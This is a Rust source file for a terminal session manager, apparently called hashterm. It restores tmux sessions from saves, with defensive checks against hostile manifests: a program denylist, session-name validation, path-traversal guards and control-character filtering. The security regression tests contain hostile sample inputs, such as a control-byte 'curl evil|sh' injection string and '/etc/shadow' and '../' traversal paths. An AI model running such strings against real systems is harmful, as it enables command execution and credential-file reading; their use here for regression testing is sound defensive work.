//! Restore algorithm: rebuild sessions/windows/panes on the dedicated server,
//! apply verbatim layout strings, replay scrollback and restart safe-listed
//! programs via the `hashterm restore-pane` helper spawned as each pane's
//! command (it streams history to the pty, then exec()s the target).

use crate::schema::*;
use crate::store::{SessionStore, StoreError};
use hashterm_tmux::controller::{
    ACCENT_OPTION, GROUP_COLOR_OPTION, GROUP_OPTION, TITLE_CUSTOM_OPTION, TITLE_OPTION,
};
use hashterm_tmux::{TmuxController, TmuxError, unique_session_name};
use std::path::{Path, PathBuf};

/// Programs never auto-restarted regardless of the user safe-list.
const DENYLIST: &[&str] = &["sudo", "su", "sudoedit", "doas", "passwd", "ssh-add"];

#[derive(Debug, thiserror::Error)]
pub enum RestoreError {
    #[error(transparent)]
    Tmux(#[from] TmuxError),
    #[error(transparent)]
    Store(#[from] StoreError),
    #[error("session '{0}' already exists on the server (conflict policy: skip)")]
    Conflict(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OnConflict {
    Skip,
    /// Restore under a fresh ht-* name (default; the GUI shows titles, not names).
    Rename,
    Replace,
}

#[derive(Debug, Clone)]
pub struct RestoreOptions {
    pub on_conflict: OnConflict,
    /// basenames allowed to auto-restart.
    pub programs: Vec<String>,
    pub restart_arbitrary: bool,
    /// Pre-type (without running) the captured command in panes whose
    /// program was not auto-restarted — browser-style "reload on Enter".
    pub pretype_unrestored: bool,
    /// Shell to exec after replay; None = $SHELL of the restoring process.
    pub shell: Option<String>,
    /// Path to the hashterm binary providing `restore-pane`.
    pub helper: PathBuf,
}

#[derive(Debug, Default)]
pub struct RestoreReport {
    /// (saved name, live name) — differs when renamed on conflict.
    pub restored: Vec<(String, String)>,
    pub skipped: Vec<String>,
    /// Human-readable notes (missing cwd, failed layouts, ...).
    pub notes: Vec<String>,
}

/// Restore every session of a save. Returns live session names in saved order.
pub fn restore_save(
    ctl: &TmuxController,
    store: &SessionStore,
    name: &str,
    auto: bool,
    opts: &RestoreOptions,
) -> Result<RestoreReport, RestoreError> {
    let (manifest, dir) = store.load(name, auto)?;
    let mut report = RestoreReport::default();
    let live: Vec<String> = ctl.list_sessions()?.into_iter().map(|s| s.name).collect();

    for session in &manifest.sessions {
        // A hostile save could name a session with tmux target metacharacters
        // (`=`, `*`, `-`, `:`) that would address other live sessions in the
        // kill-session/set-option calls below. Skip anything not our shape.
        if !valid_session_name(&session.name) {
            report
                .notes
                .push(format!("skipped session with invalid name {:?}", session.name));
            continue;
        }
        let target = if live.contains(&session.name) {
            match opts.on_conflict {
                OnConflict::Skip => {
                    report.skipped.push(session.name.clone());
                    continue;
                }
                OnConflict::Rename => unique_session_name(),
                OnConflict::Replace => {
                    ctl.run(&["kill-session", "-t", &session.name])?;
                    session.name.clone()
                }
            }
        } else {
            session.name.clone()
        };
        restore_session(
            ctl,
            session,
            &target,
            &dir,
            manifest.client_size,
            opts,
            &mut report,
        )?;
        report.restored.push((session.name.clone(), target));
    }
    Ok(report)
}

fn restore_session(
    ctl: &TmuxController,
    session: &SessionDump,
    name: &str,
    save_dir: &Path,
    client_size: (u16, u16),
    opts: &RestoreOptions,
    report: &mut RestoreReport,
) -> Result<(), RestoreError> {
    let (cw, ch) = (client_size.0.to_string(), client_size.1.to_string());

    for (wi, window) in session.windows.iter().enumerate() {
        let win_target = format!("{name}:{}", window.index);
        for (pi, pane) in window.panes.iter().enumerate() {
            let cwd = existing_dir(&pane.cwd, report);
            let spawn = spawn_command(pane, save_dir, opts, report);
            if wi == 0 && pi == 0 {
                // Session + first window + first pane in one step, at the
                // original client size so layouts apply cleanly.
                ctl.run(&[
                    "new-session",
                    "-d",
                    "-s",
                    name,
                    "-x",
                    &cw,
                    "-y",
                    &ch,
                    "-c",
                    &cwd,
                    &spawn,
                ])?;
            } else if pi == 0 {
                ctl.run(&["new-window", "-d", "-t", &win_target, "-c", &cwd, &spawn])?;
            } else {
                ctl.run(&["split-window", "-d", "-t", &win_target, "-c", &cwd, &spawn])?;
            }
        }

        if wi == 0 {
            // new-session put the first window at base-index; move if the save
            // used a different index (no-op error if identical is fine).
            let created = format!("{name}:^");
            if ctl
                .run(&["move-window", "-s", &created, "-t", &win_target])
                .is_err()
            {
                // Already at the right index.
            }
        }

        // Verbatim saved layout; its own tmux checksum validates integrity.
        if window.panes.len() > 1
            && let Err(e) = ctl.run(&["select-layout", "-t", &win_target, &window.layout])
        {
            report
                .notes
                .push(format!("layout failed for {win_target}: {e}; kept tiled"));
            let _ = ctl.run(&["select-layout", "-t", &win_target, "tiled"]);
        }

        // Rename after spawn so automatic-rename doesn't clobber it.
        ctl.run(&["rename-window", "-t", &win_target, &window.name])?;

        // Browser-style: stage the captured command at the prompt of panes
        // whose program wasn't auto-restarted. MUST wait for the replay
        // helper to exec() into the shell first — bytes sent during replay
        // are echoed by the pty straight into the middle of the restored
        // scrollback.
        if opts.pretype_unrestored {
            let helper_name = opts
                .helper
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| "hashterm".into());
            for pane in &window.panes {
                if let Some(fg) = &pane.fg
                    && !restartable(fg, opts)
                    && !argv_has_denied(&fg.argv)
                {
                    if !is_safe_pretype(&fg.argv) {
                        report.notes.push(format!(
                            "refused to pre-type command with control characters in pane {}.{}",
                            window.index, pane.index
                        ));
                        continue;
                    }
                    let target = format!("{win_target}.{}", pane.index);
                    wait_for_shell(ctl, &target, &helper_name);
                    let cmdline = shell_join(&fg.argv);
                    if let Err(e) = ctl.run(&["send-keys", "-t", &target, "-l", &cmdline]) {
                        report
                            .notes
                            .push(format!("could not pre-type command in {target}: {e}"));
                    }
                }
            }
        }

        // Focus the saved active pane.
        if let Some(active) = window.panes.iter().find(|p| p.active) {
            let _ = ctl.run(&[
                "select-pane",
                "-t",
                &format!("{win_target}.{}", active.index),
            ]);
        }
    }

    ctl.run(&["set-option", "-t", name, TITLE_OPTION, &session.title])?;
    if session.title_custom {
        ctl.run(&["set-option", "-t", name, TITLE_CUSTOM_OPTION, "1"])?;
    }
    if let Some(accent) = &session.accent {
        ctl.run(&["set-option", "-t", name, ACCENT_OPTION, accent])?;
    }
    // Groups merge by NAME with any live group; on color conflict the next
    // GUI sync self-heals to the first member's color (live wins).
    if let Some(group) = &session.group {
        ctl.run(&["set-option", "-t", name, GROUP_OPTION, group])?;
    }
    if let Some(color) = &session.group_color {
        ctl.run(&["set-option", "-t", name, GROUP_COLOR_OPTION, color])?;
    }
    let _ = ctl.run(&[
        "select-window",
        "-t",
        &format!("{name}:{}", session.active_window),
    ]);
    Ok(())
}

/// Block until the pane's process is no longer the replay helper (scrollback
/// replay finished, shell exec'd), capped at 10s. Replay is normally
/// millisecond-fast; huge scrollbacks take longer.
fn wait_for_shell(ctl: &TmuxController, target: &str, helper_name: &str) {
    for _ in 0..100 {
        match ctl.run(&[
            "display-message",
            "-p",
            "-t",
            target,
            "#{pane_current_command}",
        ]) {
            Ok(cmd) if cmd.trim() != helper_name => return,
            Err(_) => return, // pane gone; send-keys will report it
            _ => std::thread::sleep(std::time::Duration::from_millis(100)),
        }
    }
}

fn existing_dir(cwd: &Path, report: &mut RestoreReport) -> String {
    if cwd.is_dir() {
        cwd.to_string_lossy().into_owned()
    } else {
        report
            .notes
            .push(format!("cwd {} missing; used $HOME", cwd.display()));
        std::env::var("HOME").unwrap_or_else(|_| "/".into())
    }
}

/// The single shell-word command tmux runs in the new pane: our restore-pane
/// helper, which replays scrollback then exec()s the shell or program.
fn spawn_command(
    pane: &PaneDump,
    save_dir: &Path,
    opts: &RestoreOptions,
    report: &mut RestoreReport,
) -> String {
    let mut argv: Vec<String> = vec![
        opts.helper.to_string_lossy().into_owned(),
        "restore-pane".into(),
    ];
    if let Some(sb) = &pane.scrollback {
        match safe_scrollback_path(save_dir, &sb.file) {
            Some(path) => {
                argv.push("--scrollback".into());
                argv.push(path.to_string_lossy().into_owned());
            }
            None => report.notes.push(format!(
                "refused out-of-save scrollback path {:?}; pane restored without history",
                sb.file
            )),
        }
    }
    if let Some(shell) = &opts.shell {
        argv.push("--shell".into());
        argv.push(shell.clone());
    }
    if let Some(fg) = &pane.fg {
        if restartable(fg, opts) {
            argv.push("--exec".into());
            let mut exec_argv = fg.argv.clone();
            // Editor state: vim/nvim resume a Session.vim from the program's
            // cwd when present (auto-maintained by e.g. vim-obsession).
            // SECURITY: Session.vim runs arbitrary Ex commands, so only trust
            // one discovered in the PANE's own cwd (not a manifest-chosen
            // directory), under $HOME, and reached without a symlink.
            if matches!(fg.name.as_str(), "vim" | "nvim" | "vi")
                && !exec_argv.iter().any(|a| a == "-S")
                && fg.cwd == pane.cwd
                && home_dir().is_some_and(|h| fg.cwd.starts_with(&h))
            {
                let session_file = fg.cwd.join("Session.vim");
                let is_regular = std::fs::symlink_metadata(&session_file)
                    .map(|m| m.file_type().is_file())
                    .unwrap_or(false);
                if is_regular {
                    exec_argv.push("-S".into());
                    exec_argv.push(session_file.to_string_lossy().into_owned());
                }
            }
            argv.extend(exec_argv);
        } else if !DENYLIST.contains(&fg.name.as_str()) && !opts.pretype_unrestored {
            report.notes.push(format!(
                "'{}' not in restore.programs safe-list; pane restored as shell",
                fg.name
            ));
        }
    }
    shell_join(&argv)
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .filter(|h| !h.is_empty())
        .map(PathBuf::from)
}

/// Basename of a path token, lowercased (denylist/allow-list comparisons).
fn basename_lower(s: &str) -> String {
    Path::new(s)
        .file_name()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
}

/// A denylisted program appears anywhere in argv (catches `env sudo …`,
/// absolute `/usr/bin/sudo`, wrappers). Compared by basename, case-folded.
fn argv_has_denied(argv: &[String]) -> bool {
    argv.iter()
        .any(|a| DENYLIST.contains(&basename_lower(a).as_str()))
}

fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
    let Some(arg0) = fg.argv.first() else {
        return false;
    };
    // SECURITY: the safe-list/denylist are meaningful only if they gate the
    // program actually exec'd — argv[0] — not the manifest's advisory `name`
    // field (an attacker controls them independently). Require them to agree,
    // then decide on the derived basename, and refuse if ANY argv token is a
    // denylisted program.
    let base = basename_lower(arg0);
    if base.is_empty() || fg.name.to_ascii_lowercase() != base {
        return false;
    }
    if argv_has_denied(&fg.argv) {
        return false;
    }
    opts.restart_arbitrary
        || opts
            .programs
            .iter()
            .any(|p| p.to_ascii_lowercase() == base)
}

/// Pre-typing puts these bytes under the shell cursor via `send-keys -l`,
/// below the shell's own parsing. Any control byte (Ctrl-U kill-line, CR
/// accept-line, ESC, …) turns "text sitting at the prompt" into "command
/// executed", so refuse to pre-type argv carrying them.
fn is_safe_pretype(argv: &[String]) -> bool {
    argv.iter()
        .all(|a| a.bytes().all(|b| b >= 0x20 && b != 0x7f))
}

/// Manifest session names reach tmux `-t` targets and `set-option`; tmux
/// target syntax treats `=`, `*`, `-`, `:` specially. Only accept our own
/// `ht-<hex/uuid>` shape so a hostile save can't address arbitrary sessions.
fn valid_session_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Resolve `sb.file` (manifest-controlled) to a path guaranteed to live
/// inside the save dir: no absolute paths, no `..`/`.` traversal.
fn safe_scrollback_path(save_dir: &Path, file: &Path) -> Option<PathBuf> {
    use std::path::Component;
    if file.components().any(|c| {
        !matches!(c, Component::Normal(_)) // rejects RootDir, ParentDir, CurDir, Prefix
    }) {
        return None;
    }
    let full = save_dir.join(file);
    full.starts_with(save_dir).then_some(full)
}

/// POSIX single-quote each token: safe against spaces, $, quotes, globs.
fn shell_join(argv: &[String]) -> String {
    argv.iter()
        .map(|a| format!("'{}'", a.replace('\'', r"'\''")))
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts() -> RestoreOptions {
        RestoreOptions {
            on_conflict: OnConflict::Rename,
            programs: vec!["htop".into()],
            restart_arbitrary: false,
            pretype_unrestored: false,
            shell: None,
            helper: "/usr/bin/hashterm".into(),
        }
    }

    fn pane(fg: Option<FgProc>) -> PaneDump {
        PaneDump {
            index: 0,
            active: true,
            title: String::new(),
            cwd: "/".into(),
            alternate_on: false,
            in_mode: false,
            fg,
            scrollback: None,
        }
    }

    #[test]
    fn shell_join_quotes_metacharacters() {
        assert_eq!(
            shell_join(&["a b".into(), "it's".into(), "$HOME".into()]),
            r#"'a b' 'it'\''s' '$HOME'"#
        );
    }

    #[test]
    fn denylisted_never_restarts() {
        let fg = FgProc {
            name: "sudo".into(),
            argv: vec!["sudo".into(), "rm".into()],
            cwd: "/".into(),
        };
        let mut o = opts();
        o.restart_arbitrary = true;
        assert!(!restartable(&fg, &o));
    }

    #[test]
    fn safelisted_restarts_others_dont() {
        let htop = FgProc {
            name: "htop".into(),
            argv: vec!["htop".into()],
            cwd: "/".into(),
        };
        let make = FgProc {
            name: "make".into(),
            argv: vec!["make".into(), "-j8".into()],
            cwd: "/".into(),
        };
        assert!(restartable(&htop, &opts()));
        assert!(!restartable(&make, &opts()));
        let mut arbitrary = opts();
        arbitrary.restart_arbitrary = true;
        assert!(restartable(&make, &arbitrary));
    }

    #[test]
    fn spawn_command_includes_exec_for_safelisted() {
        let mut report = RestoreReport::default();
        let p = pane(Some(FgProc {
            name: "htop".into(),
            argv: vec!["htop".into(), "-d".into(), "10".into()],
            cwd: "/".into(),
        }));
        let cmd = spawn_command(&p, Path::new("/tmp/save"), &opts(), &mut report);
        assert!(cmd.contains("'--exec' 'htop' '-d' '10'"));
        assert!(cmd.starts_with("'/usr/bin/hashterm' 'restore-pane'"));
    }

    // --- P0 security regressions (#1, #2, #4, #6) ---

    #[test]
    fn name_argv_mismatch_is_not_restartable() {
        // #1: safe-list matches `name`, but argv[0] is a different binary.
        let fg = FgProc {
            name: "htop".into(),
            argv: vec!["/tmp/payload".into()],
            cwd: "/".into(),
        };
        let mut o = opts();
        o.programs = vec!["htop".into()];
        assert!(!restartable(&fg, &o));
    }

    #[test]
    fn denylisted_token_anywhere_blocks_restart() {
        // #1: `env sudo …` — env not denied, sudo hides in argv[1].
        let fg = FgProc {
            name: "env".into(),
            argv: vec!["env".into(), "sudo".into(), "sh".into()],
            cwd: "/".into(),
        };
        let mut o = opts();
        o.programs = vec!["env".into()];
        assert!(!restartable(&fg, &o));
        // …and absolute-path sudo is caught by basename.
        let fg2 = FgProc {
            name: "ssh".into(),
            argv: vec!["/usr/bin/sudo".into(), "-n".into()],
            cwd: "/".into(),
        };
        let mut o2 = opts();
        o2.programs = vec!["ssh".into()];
        assert!(!restartable(&fg2, &o2));
    }

    #[test]
    fn control_bytes_are_not_safe_to_pretype() {
        // #2: Ctrl-U + CR injection shape.
        assert!(!is_safe_pretype(&["\u{15}curl evil|sh\r".into()]));
        assert!(!is_safe_pretype(&["ok".into(), "bad\n".into()]));
        assert!(is_safe_pretype(&["make".into(), "-j8".into()]));
    }

    #[test]
    fn scrollback_path_stays_in_save_dir() {
        // #4: absolute and traversal both refused; a plain name is kept.
        let root = Path::new("/tmp/save");
        assert_eq!(
            safe_scrollback_path(root, Path::new("panes/0.zst")),
            Some(PathBuf::from("/tmp/save/panes/0.zst"))
        );
        assert_eq!(safe_scrollback_path(root, Path::new("/etc/shadow")), None);
        assert_eq!(
            safe_scrollback_path(root, Path::new("../../etc/x.zst")),
            None
        );
    }

    #[test]
    fn session_name_shape_enforced() {
        // #6: tmux target metacharacters rejected.
        assert!(valid_session_name("ht-01a0121f27b69f40"));
        assert!(!valid_session_name("*"));
        assert!(!valid_session_name("a:b"));
        assert!(!valid_session_name("=evil"));
        assert!(!valid_session_name(&"x".repeat(65)));
        assert!(!valid_session_name(""));
    }
}
